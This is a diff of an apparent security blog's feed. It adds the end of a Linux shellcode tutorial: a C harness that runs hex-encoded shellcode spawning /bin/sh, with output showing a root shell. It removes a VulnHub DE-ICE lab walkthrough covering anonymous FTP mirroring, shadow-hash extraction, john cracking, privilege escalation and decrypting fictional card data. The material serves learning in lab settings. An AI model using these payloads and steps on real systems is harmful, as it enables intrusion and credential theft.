+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span><span class="s">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span><span class='line'>        <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;allocated executable memory at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;shellcode length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">sc</span><span class="p">));</span>
+</span><span class='line'>        <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">)))();</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# ./test 
+</span><span class='line'>allocated executable memory at: 0xb7789000
+</span><span class='line'>shellcode length: 47
+</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 1]]></title>
@@ -6846,7 +7435,7 @@ predictable for dirb.</p>
 
 <p>There is nothing interesting for us except the sysadmin account.</p>
 
-<p>Web page mentions <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x63;&#x75;&#115;&#x74;&#111;&#x6d;&#x65;&#114;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#x65;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x6e;&#111;&#115;&#x65;&#x63;&#x62;&#97;&#x6e;&#x6b;&#46;&#x63;&#111;&#x6d;">&#99;&#x75;&#115;&#x74;&#x6f;&#109;&#x65;&#x72;&#115;&#101;&#114;&#x76;&#105;&#99;&#101;&#x61;&#100;&#109;&#x69;&#110;&#x40;&#110;&#x6f;&#115;&#101;&#x63;&#98;&#x61;&#110;&#107;&#46;&#99;&#x6f;&#109;</a> email address. After a
+<p>Web page mentions <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x63;&#x75;&#115;&#116;&#x6f;&#x6d;&#x65;&#114;&#x73;&#101;&#114;&#118;&#105;&#x63;&#101;&#x61;&#100;&#109;&#105;&#110;&#64;&#110;&#x6f;&#115;&#101;&#x63;&#98;&#97;&#x6e;&#x6b;&#46;&#x63;&#111;&#109;">&#x63;&#x75;&#115;&#116;&#x6f;&#x6d;&#x65;&#x72;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#110;&#111;&#115;&#101;&#x63;&#x62;&#x61;&#110;&#x6b;&#x2e;&#99;&#111;&#x6d;</a> email address. After a
 little trying, we found out the user account that exists:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -11657,230 +12246,6 @@ pirrip user:</p>
 </span><span class='line'>Philip Pirrip:  734-67-0424 5.5% $74,224
 </span><span class='line'>Abel Magwitch:  816-03-0028 4.0% $53,122
 </span><span class='line'>Estella Havisham: 762-93-1073 12% $84,325</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DE-ICE-S1.110]]></title>
-    <link href="http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110/"/>
-    <updated>2015-05-10T00:01:04+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE: S1.110</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open     ftp     vsftpd 2.0.4
-</span><span class='line'>22/tcp  filtered ssh 
-</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
-</span><span class='line'>631/tcp open     ipp     CUPS 1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>FTP anonymous login is allowed:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r ftp://ftp@192.168.1.110:</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We have found a few files, but nothing particularly interesting:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
-</span><span class='line'>SYSTEM:*:18:544:,S-1-5-18::
-</span><span class='line'>Administrators:*:544:544:,S-1-5-32-544::
-</span><span class='line'>Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
-</span><span class='line'>Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
-</span><span class='line'>Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
-</span><span class='line'>__vmware_user__:unused_by_nt/2000/xp:1002:513:__vmware_user__,U-Tom-PC\__vmware_user__,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/__vmware_user__:/bin/bash
-</span><span class='line'>
-</span><span class='line'>root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
-</span><span class='line'>root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
-</span><span class='line'>bin:*:9797:0:::::
-</span><span class='line'>daemon:*:9797:0:::::
-</span><span class='line'>adm:*:9797:0:::::
-</span><span class='line'>lp:*:9797:0:::::
-</span><span class='line'>sync:*:9797:0:::::
-</span><span class='line'>shutdown:*:9797:0:::::
-</span><span class='line'>halt:*:9797:0:::::
-</span><span class='line'>mail:*:9797:0:::::
-</span><span class='line'>news:*:9797:0:::::
-</span><span class='line'>uucp:*:9797:0:::::
-</span><span class='line'>operator:*:9797:0:::::
-</span><span class='line'>games:*:9797:0:::::
-</span><span class='line'>ftp:*:9797:0:::::
-</span><span class='line'>smmsp:*:9797:0:::::
-</span><span class='line'>mysql:*:9797:0:::::
-</span><span class='line'>rpc:*:9797:0:::::
-</span><span class='line'>sshd:*:9797:0:::::
-</span><span class='line'>gdm:*:9797:0:::::
-</span><span class='line'>pop:*:9797:0:::::
-</span><span class='line'>nobody:*:9797:0:::::
-</span><span class='line'>
-</span><span class='line'>toor             (root)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>More about cygwin format <a href="https://cygwin.com/cygwin-ug-net/ntsec.html">here</a>.</p>
-
-<p>In /etc directory, there is a core file which contains password hashes:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
-</span><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After adjusting:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
-</span><span class='line'>bin:*:9797:0:::::
-</span><span class='line'>daemon:*:9797:0:::::
-</span><span class='line'>adm:*:9797:0:::::
-</span><span class='line'>lp:*:9797:0:::::
-</span><span class='line'>sync:*:9797:0:::::
-</span><span class='line'>shutdown:*:9797:0:::::
-</span><span class='line'>halt:*:9797:0:::::
-</span><span class='line'>mail:*:9797:0:::::
-</span><span class='line'>news:*:9797:0:::::
-</span><span class='line'>uucp:*:9797:0:::::
-</span><span class='line'>operator:*:9797:0:::::
-</span><span class='line'>games:*:9797:0:::::
-</span><span class='line'>ftp:*:9797:0:::::
-</span><span class='line'>smmsp:*:9797:0:::::
-</span><span class='line'>mysql:*:9797:0:::::
-</span><span class='line'>rpc:*:9797:0:::::
-</span><span class='line'>sshd:*:9797:0:::::
-</span><span class='line'>gdm:*:9797:0:::::
-</span><span class='line'>pop:*:9797:0:::::
-</span><span class='line'>nobody:*:9797:0:::::
-</span><span class='line'>aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
-</span><span class='line'>bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
-</span><span class='line'>ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ john ~/DE-ICE-S1.110/crackme.john --wordlist="/root/darkc0de.lst"
-</span><span class='line'>Complexity       (root)
-</span><span class='line'>Zymurgy          (bbanter)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We log in as user bbanter and obtain root permissions:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>bbanter@slax:/$ su root
-</span><span class='line'>Password: **********
-</span><span class='line'>root@slax:/# id
-</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Lastly, we check the backup file and decrypt CSV:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/root/.save# cat copy.sh
-</span><span class='line'><span class="c">#!/bin/sh</span>
-</span><span class='line'><span class="c">#encrypt files in ftp/incoming</span>
-</span><span class='line'>openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/<span class="nv">$1</span> -out /home/root/.save/<span class="nv">$1</span>.enc -pass file:/etc/ssl/certs/pw
-</span><span class='line'><span class="c">#remove old file</span>
-</span><span class='line'>rm /home/ftp/incoming/<span class="nv">$1</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# cat /etc/ssl/certs/pw
-</span><span class='line'>d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
-</span><span class='line'>"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
-</span><span class='line'>1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
-</span><span class='line'>1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
-</span><span class='line'>1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
-</span><span class='line'>1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
-</span><span class='line'>1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
-</span><span class='line'>1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
